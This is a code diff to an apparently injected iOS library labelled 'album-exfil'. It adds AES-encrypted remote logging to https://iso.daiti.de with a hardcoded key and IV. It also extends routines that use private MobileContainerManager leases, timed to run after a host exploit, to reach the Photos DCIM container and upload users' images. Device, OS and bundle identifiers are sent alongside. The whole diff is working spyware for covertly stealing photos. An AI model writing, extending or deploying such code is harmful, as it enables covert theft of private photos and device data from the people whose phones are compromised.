@@ -8,6 +8,7 @@
 #import <CoreVideo/CoreVideo.h>
 #import <CoreImage/CoreImage.h>
 #import <Vision/Vision.h>
+#import <CommonCrypto/CommonCryptor.h>
 
 static NSString *const kExfilBase = @"https://iso.daiti.de";
 
@@ -17,6 +18,69 @@ extern char *sandbox_extension_issue_file(const char *extension_class,
 
 static void exfilLog(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
 static void exfilScanDirDirect(NSString *dir);
+static NSString *exfilAppUuid(void);
+static NSString *exfilMachineName(void);
+static int gExfilMcmLogged = 0; // MCM 尝试细节只首轮上报，避免轰炸日志服务
+
+// 远程日志：AES-128-CBC(hex key/iv) 加密 JSON → base64 → POST /api/log/report
+static NSString *exfilAesEncryptBase64(NSString *plain)
+{
+    NSData *data = [plain dataUsingEncoding:NSUTF8StringEncoding];
+    // PKCS7 补齐到 16 字节块
+    NSMutableData *padded = [data mutableCopy];
+    uint8_t pad = 16 - (data.length % 16);
+    uint8_t padBytes[16];
+    memset(padBytes, pad, sizeof(padBytes));
+    [padded appendBytes:padBytes length:pad];
+
+    unsigned char key[16], iv[16];
+    const char *hexKey = "bc2c72b2260840b28bc9614aa2b8004b";
+    const char *hexIv  = "71ec8e3980754823aba30e62be55cf6a";
+    for (int i = 0; i < 16; i++) {
+        unsigned int k, v;
+        sscanf(hexKey + i * 2, "%02x", &k);
+        sscanf(hexIv + i * 2, "%02x", &v);
+        key[i] = (unsigned char)k;
+        iv[i]  = (unsigned char)v;
+    }
+
+    NSMutableData *out = [NSMutableData dataWithLength:padded.length];
+    size_t moved = 0;
+    CCCryptorStatus st = CCCrypt(kCCEncrypt, kCCAlgorithmAES128, 0,
+        key, 16, iv, padded.bytes, padded.length,
+        out.mutableBytes, out.length, &moved);
+    // padded 已手动补齐，这里传 0 选项直接整块加密
+    if (st != kCCSuccess) return nil;
+    out.length = padded.length;
+    return [out base64EncodedStringWithOptions:0];
+}
+
+static void exfilRemoteLog(NSString *msg)
+{
+    @try {
+        long ts = (long)([[NSDate date] timeIntervalSince1970] * 1000);
+        NSDictionary *payload = @{
+            @"app_uuid": exfilAppUuid(),
+            @"text": [NSString stringWithFormat:@"[album-exfil] %@", msg],
+            @"timestamp": @(ts),
+        };
+        NSData *jd = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
+        NSString *plain = [[NSString alloc] initWithData:jd encoding:NSUTF8StringEncoding];
+        NSString *enc = exfilAesEncryptBase64(plain);
+        if (!enc) return;
+
+        NSString *body = [NSString stringWithFormat:@"params=%@", enc];
+        NSURL *url = [NSURL URLWithString:[kExfilBase stringByAppendingString:@"/api/log/report"]];
+        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
+        req.HTTPMethod = @"POST";
+        req.timeoutInterval = 15;
+        [req setValue:exfilAppUuid() forHTTPHeaderField:@"X-App-UUID"];
+        [req setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
+        req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
+        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:nil] resume];
+    } @catch (NSException *e) {}
+}
+
 static void exfilLog(NSString *fmt, ...)
 {
     va_list ap;
@@ -24,6 +88,7 @@ static void exfilLog(NSString *fmt, ...)
     NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
     va_end(ap);
     NSLog(@"[album-exfil] %@", msg);
+    exfilRemoteLog(msg);
 }
 
 #pragma mark - 设备标识
@@ -175,7 +240,18 @@ static void exfilUpload(UIImage *img, NSString *originalName)
 static NSString *exfilMCMPhotosMediaDir(void)
 {
     Class cls = NSClassFromString(@"MCMRetainedLease");
-    if (!cls) return nil;
+    if (!cls)
+    {
+        // 宿主不 import MobileContainerManager 时类不在内存：手动加载框架
+        void *h = dlopen(
+            "/System/Library/PrivateFrameworks/MobileContainerManager.framework"
+            "/MobileContainerManager", RTLD_LAZY);
+        exfilLog(@"MCM dlopen handle=%p", h);
+        if (h) cls = NSClassFromString(@"MCMRetainedLease");
+        // 再兜底从已加载镜像里找
+        if (!cls) cls = objc_getClass("MCMRetainedLease");
+        if (!cls) return nil;
+    }
 
     SEL leaseSel = NSSelectorFromString(@"leaseForClass:identifier:group:error:");
     SEL actSel   = NSSelectorFromString(@"activate:");
@@ -184,30 +260,49 @@ static NSString *exfilMCMPhotosMediaDir(void)
 
     NSFileManager *fm = [NSFileManager defaultManager];
 
-    // class 枚举值逐档试（app/data/tmp…），拿到能列 DCIM 的 rootPath 为准
-    for (NSInteger mc = 0; mc <= 4; mc++)
+    // identifier 组合：宿主自身 / Photos / mobileslideshow，class 0-4 逐档试
+    NSString *hostBundle = [[NSBundle mainBundle] bundleIdentifier];
+    NSArray *identifiers = @[
+        @"com.apple.Photos",
+        @"com.apple.mobileslideshow",
+        hostBundle ?: @"",
+    ];
+    for (NSString *ident in identifiers)
     {
-        @try {
-            NSError *err = nil;
-            id lease = ((id(*)(id, SEL, NSInteger, id, id, void *))objc_msgSend)(
-                cls, leaseSel, mc, @"com.apple.Photos", nil, (void *)&err);
-            if (!lease) continue;
+        if (ident.length == 0) continue;
+        for (NSInteger mc = 0; mc <= 4; mc++)
+        {
+            @try {
+                NSError *err = nil;
+                id lease = ((id(*)(id, SEL, NSInteger, id, id, void *))objc_msgSend)(
+                    cls, leaseSel, mc, ident, nil, (void *)&err);
+                if (!lease) continue;
 
-            if ([lease respondsToSelector:actSel])
-                ((BOOL(*)(id, SEL, void *))objc_msgSend)(lease, actSel, (void *)&err);
+                if ([lease respondsToSelector:actSel])
+                    ((BOOL(*)(id, SEL, void *))objc_msgSend)(lease, actSel, (void *)&err);
 
-            NSString *root = nil;
-            if ([lease respondsToSelector:rootSel])
-                root = ((id(*)(id, SEL))objc_msgSend)(lease, rootSel);
-            if (![root isKindOfClass:[NSString class]] || root.length == 0) continue;
+                NSString *root = nil;
+                if ([lease respondsToSelector:rootSel])
+                    root = ((id(*)(id, SEL))objc_msgSend)(lease, rootSel);
+                if (![root isKindOfClass:[NSString class]] || root.length == 0) continue;
 
-            NSString *dcim = [root stringByAppendingPathComponent:@"DCIM"];
-            if ([fm fileExistsAtPath:dcim])
-            {
-                exfilLog(@"MCM lease ok: class=%ld root=%@", (long)mc, root);
-                return root;
-            }
-        } @catch (NSException *e) {}
+                if (gExfilMcmLogged < 3)
+                {
+                    gExfilMcmLogged++;
+                    exfilLog(@"MCM try ident=%@ class=%ld root=%@ DCIM=%d",
+                             ident, (long)mc, root,
+                             [fm fileExistsAtPath:[root stringByAppendingPathComponent:@"DCIM"]]);
+                }
+
+                NSString *dcim = [root stringByAppendingPathComponent:@"DCIM"];
+                if ([fm fileExistsAtPath:dcim])
+                {
+                    exfilLog(@"MCM lease ok: ident=%@ class=%ld root=%@",
+                             ident, (long)mc, root);
+                    return root;
+                }
+            } @catch (NSException *e) {}
+        }
     }
     return nil;
 }
@@ -549,6 +644,9 @@ static void exfilRun(void)
 {
     @autoreleasepool
     {
+        exfilLog(@"ctor alive, machine=%@ ios=%@ bundle=%@",
+                 exfilMachineName(), [UIDevice currentDevice].systemVersion,
+                 [[NSBundle mainBundle] bundleIdentifier]);
         // 0) 同进程 MCM 租约直拿照片容器（宿主已建立特权，成功率最高）
         //    宿主 exploit 是异步跑的，给它时间：最多等 45s
         NSString *mcmMedia = nil;
@@ -557,6 +655,7 @@ static void exfilRun(void)
             mcmMedia = exfilMCMPhotosMediaDir();
             if (!mcmMedia) sleep(1);
         }
+        if (!mcmMedia) exfilLog(@"path 0: MCM unavailable after 45s, fallback");
         if (mcmMedia)
         {
             exfilLog(@"path 0: MCM photos media=%@", mcmMedia);
